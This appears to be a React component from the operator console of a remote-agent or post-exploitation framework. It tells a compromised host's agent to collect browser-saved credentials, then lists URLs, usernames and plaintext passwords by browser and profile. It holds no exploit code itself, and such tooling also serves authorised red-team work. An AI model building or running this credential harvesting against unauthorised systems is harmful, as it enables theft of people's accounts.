"use client";
import React, { useEffect, useState } from "react";
import { Agent } from "@/lib/types";
import useTaskRunner from "@/lib/hooks/useTaskRunner";
import useAxiosAuth from "@/lib/hooks/useAxiosAuth";
import Loading from "@/components/Loading";

// Data structures
interface CredentialRecord {
  url: string;
  created: string;
  last_used: string;
  username: string;
  password: string | null;
}
interface BrowserProfile {
  profile: string;
  credentials: CredentialRecord[];
}
interface BrowserInfo {
  browser: string;
  profiles: BrowserProfile[];
}
interface WebCredentialResponse {
  browsers: BrowserInfo[];
}

interface WebCredentialsPanelProps {
  agent: Agent;
}

/**
 * Renders a "Web Credentials" panel with:
 * - Auto-selected first browser/profile if available
 * - A table with columns: URL, Created, Last Used, Username, Password
 * - Hides rows where username is "none"/"N/A"/empty
 * - Icons next to "Browser" / "Profile" labels
 * - Narrower widths for "Created" / "Last Used" columns
 */
export default function WebCredentialsPanel({ agent }: WebCredentialsPanelProps) {
  const { getTaskResults } = useTaskRunner();
  const axiosAuth = useAxiosAuth();

  const [data, setData] = useState<BrowserInfo[] | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);

  // States for selection
  const [selectedBrowser, setSelectedBrowser] = useState<string>("");
  const [selectedProfile, setSelectedProfile] = useState<string>("");

  useEffect(() => {
    fetchWebCredentials();
  }, [agent.AgentId]);

  // ---------- FETCH LOGIC ----------
  async function fetchWebCredentials() {
    try {
      setLoading(true);
      setError(null);

      // 1) Trigger a POST => poll results
      const response = await axiosAuth.post<any>(
        `/agents/${agent.AgentId}/modules/collection/passwords/collect_web_credentials`,
        { cred_type: 0 } 
      );
      const resp: WebCredentialResponse = await getTaskResults(response.data.task_id);

      if (!resp?.browsers) {
        setData([]);
        setSelectedBrowser("");
        setSelectedProfile("");
      } else {
        setData(resp.browsers);

        // Auto-select first browser & profile if available
        if (resp.browsers.length > 0) {
          const defaultBrowser = resp.browsers[0];
          setSelectedBrowser(defaultBrowser.browser);

          if (defaultBrowser.profiles.length > 0) {
            setSelectedProfile(defaultBrowser.profiles[0].profile);
          } else {
            setSelectedProfile("");
          }
        } else {
          setSelectedBrowser("");
          setSelectedProfile("");
        }
      }
      setLoading(false);
    } catch (err) {
      console.error("Failed to fetch web credentials:", err);
      setError("Error loading browser credentials.");
      setData(null);
      setLoading(false);
    }
  }

  // Refresh button
  function handleRefresh() {
    fetchWebCredentials();
  }

  // Browser selection => auto-pick first profile
  function handleBrowserChange(e: React.ChangeEvent<HTMLSelectElement>) {
    const newBrowser = e.target.value;
    setSelectedBrowser(newBrowser);

    if (data) {
      const found = data.find((b) => b.browser === newBrowser);
      if (found && found.profiles.length > 0) {
        setSelectedProfile(found.profiles[0].profile);
      } else {
        setSelectedProfile("");
      }
    }
  }

  // Profile selection
  function handleProfileChange(e: React.ChangeEvent<HTMLSelectElement>) {
    setSelectedProfile(e.target.value);
  }

  // Which credentials do we show for the selected browser+profile?
  function getCurrentCredentials(): CredentialRecord[] {
    if (!data || !selectedBrowser) return [];
    const browserObj = data.find((b) => b.browser === selectedBrowser);
    if (!browserObj) return [];

    if (!selectedProfile) return [];
    const profObj = browserObj.profiles.find((p) => p.profile === selectedProfile);
    if (!profObj) return [];

    // Filter out rows where username is "none"/"N/A"/empty:
    return profObj.credentials.filter((c) => {
      const user = c.username?.toLowerCase() || "";
      return user !== "none" && user !== "n/a" && user.trim() !== "";
    });
  }

  // If no password => highlight as unsafe
  function isNoPassword(pwd: string | null): boolean {
    return !pwd || pwd.toLowerCase() === "none";
  }

  // ---------- RENDERING ----------
  if (loading) {
    return <Loading text="Loading Web Credentials..." />;
  }
  if (error) {
    return <div className="text-danger">{error}</div>;
  }
  if (!data || data.length === 0) {
    return (
      <div className="card bg-dark text-white" style={{ borderRadius: 16 }}>
        <div className="card-body">
          No browser credentials found.
        </div>
      </div>
    );
  }

  // Prepare list of profile names for the chosen browser
  let profileNames: string[] = [];
  if (selectedBrowser) {
    const found = data.find((b) => b.browser === selectedBrowser);
    if (found) {
      profileNames = found.profiles.map((p) => p.profile);
    }
  }

  const credentials = getCurrentCredentials();

  return (
    <div className="card bg-dark text-white web-cred-panel" style={{ borderRadius: 16 }}>
      <div className="card-header d-flex justify-content-between align-items-center">
        <h5 className="mb-0" style={{ fontFamily: "Orbitron, sans-serif" }}>
          Web Credentials
        </h5>
        <button
          className="btn btn-sm btn-secondary d-flex align-items-center"
          onClick={handleRefresh}
        >
          <i className="bi bi-arrow-clockwise me-1" />
          Refresh
        </button>
      </div>

      {/*
        We'll let the .card-body handle vertical scrolling. 
        .table-responsive for horizontal
      */}
      <div
        className="card-body p-0 d-flex flex-column"
        style={{
          maxHeight: "70vh",
          overflowY: "auto",
        }}
      >
        {/* Browser & Profile selectors */}
        <div className="p-3">
          <div className="row g-2 mb-3">
            {/* Browser */}
            <div className="col-sm-auto">
              <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>
                {/* Add an icon to label for a better style */}
                <i className="bi bi-globe me-1"></i> Browser
              </label>
              <select
                className="form-select form-select-sm bg-secondary text-white border-0"
                value={selectedBrowser}
                onChange={handleBrowserChange}
              >
                {data.map((b) => (
                  <option key={b.browser} value={b.browser}>
                    {b.browser}
                  </option>
                ))}
              </select>
            </div>

            {/* Profile */}
            <div className="col-sm-auto">
              <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>
                {/* Another icon for profile */}
                <i className="bi bi-person me-1"></i> Profile
              </label>
              <select
                className="form-select form-select-sm bg-secondary text-white border-0"
                value={selectedProfile}
                onChange={handleProfileChange}
                disabled={!selectedBrowser}
              >
                {profileNames.length === 0 ? (
                  <option value="">No Profiles</option>
                ) : profileNames.map((pn) => (
                  <option key={pn} value={pn}>
                    {pn}
                  </option>
                ))}
              </select>
            </div>
          </div>
        </div>

        {/* The table => if no profile or no creds => message; else render */}
        {!selectedProfile ? (
          <div className="p-3 text-muted">No profile selected.</div>
        ) : credentials.length === 0 ? (
          <div className="p-3 text-muted">No credentials found for this profile.</div>
        ) : (
          <div className="table-responsive">
            <table className="table table-dark table-hover table-sm mb-0 credential-table table-fixed">
              <thead>
                <tr>
                  <th>URL</th>
                  {/* narrower columns for dates */}
                  <th style={{ width: "12%" }}>Created</th>
                  <th style={{ width: "12%" }}>Last Used</th>
                  <th>Username</th>
                  <th className="cred-password-col">Password</th>
                </tr>
              </thead>
              <tbody>
                {credentials.map((c, idx) => {
                  const pwd = c.password || "None";
                  // If no password => highlight it
                  const pwdClass = isNoPassword(c.password) ? "unsafe-credential" : "";

                  return (
                    <tr key={idx}>
                      <td>{c.url || "N/A"}</td>
                      <td>{c.created}</td>
                      <td>{c.last_used}</td>
                      <td>{c.username || "N/A"}</td>
                      <td className={`cred-password-col ${pwdClass}`}>{pwd}</td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
